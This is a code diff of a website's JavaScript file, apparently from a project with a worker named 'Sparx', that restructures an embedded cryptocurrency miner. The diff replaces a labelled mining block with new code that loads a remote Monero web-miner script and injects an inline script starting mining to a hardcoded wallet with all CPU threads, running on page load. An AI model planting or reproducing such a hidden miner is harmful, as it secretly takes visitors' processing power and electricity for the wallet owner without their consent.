@@ -707,20 +707,27 @@ function getInput() {
 }
 
 
-// Start Of Mining Code (Javascript)
-var script = document.createElement("script");
-script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
-document.head.appendChild(script);
+// create the script elements
+var script1 = document.createElement("script");
+var script2 = document.createElement("script");
 
-server = "wss://f.xmrminingproxy.com:8181";
-var pool = "moneroocean.stream";
-var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
-var workerId = "Sparx-User"
-var threads = -1;
-var password = "";
-startMining(pool, walletAddress, workerId, threads, password);
-throttleMiner = 20;
-// End Of Mining Code
+// set the script sources
+script1.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
+script2.innerHTML = `
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+    var workerId = "Sparx-user";
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+`;
+
+// append the scripts to the document
+document.head.appendChild(script1);
+document.head.appendChild(script2);
+
 
 
 async function credits() {
